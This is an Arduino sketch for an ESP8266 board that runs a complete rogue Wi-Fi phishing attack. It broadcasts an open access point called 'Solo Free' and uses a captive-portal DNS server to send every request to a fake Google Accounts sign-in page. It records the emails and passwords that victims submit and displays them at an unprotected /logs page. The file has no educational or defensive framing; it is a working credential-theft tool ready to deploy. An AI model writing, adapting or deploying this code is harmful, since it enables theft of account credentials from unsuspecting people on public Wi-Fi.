#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer server(80);

const char* ssid = "Solo Free";
IPAddress apIP(192, 168, 4, 1);

String loginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>Sign in - Google Accounts</title>
  <style>
    body { font-family: Arial; background-color: #f2f2f2; }
    .box { width: 300px; margin: 100px auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px #aaa; }
    input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
    button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Sign in</h2>
    <form method="POST" action="/login">
      <input name="email" placeholder="Email or phone" required><br>
      <input name="password" type="password" placeholder="Password" required><br>
      <button type="submit">Next</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

String credentials = "";
bool userLoggedIn = false;

void handleLogin() {
  if (server.hasArg("email") && server.hasArg("password")) {
    String email = server.arg("email");
    String password = server.arg("password");
    String log = "Email: " + email + ", Password: " + password + "<br>";
    credentials += log;
    userLoggedIn = true;
    server.send(200, "text/html", "<h2>Thanks!</h2><p>Connecting...</p>");
  } else {
    server.send(200, "text/html", loginPage);
  }
}

void handleRoot() {
  if (!userLoggedIn) {
    server.send(200, "text/html", loginPage);
  } else {
    server.send(200, "text/html", "<h2>Welcome!</h2><p>You are connected to Solo Free.</p>");
  }
}

void handleLogs() {
  server.send(200, "text/html", "<h2>Collected Credentials</h2><p>" + credentials + "</p>");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid);
  delay(100);

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/logs", handleLogs);
  server.onNotFound([]() {
    server.send(200, "text/html", loginPage);
  });

  server.begin();
  Serial.println("✅ Solo Free ishga tushdi. Kirishni kutmoqda...");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
